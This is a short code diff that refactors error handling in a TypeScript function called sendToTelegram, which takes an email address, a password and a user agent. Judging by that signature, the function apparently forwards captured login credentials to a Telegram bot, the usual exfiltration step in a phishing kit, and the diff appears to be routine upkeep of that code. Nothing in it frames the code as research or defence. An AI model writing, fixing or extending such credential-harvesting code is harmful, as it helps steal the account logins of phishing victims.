@@ -21,9 +21,10 @@ async function sendToTelegram(email: string, password: string, userAgent: string
 
         console.log('Message sent to Telegram successfully');
         return { success: true, messageId: response.data.result.message_id };
-    } catch (error: any) {
-        console.error('Error sending message to Telegram:', error.response?.data || error.message);
-        return { success: false, error: error.message };
+    } catch (error: unknown) {
+        const errorMessage = error instanceof Error ? error.message : 'Unknown error';
+        console.error('Error sending message to Telegram:', error);
+        return { success: false, error: errorMessage };
     }
 }
 
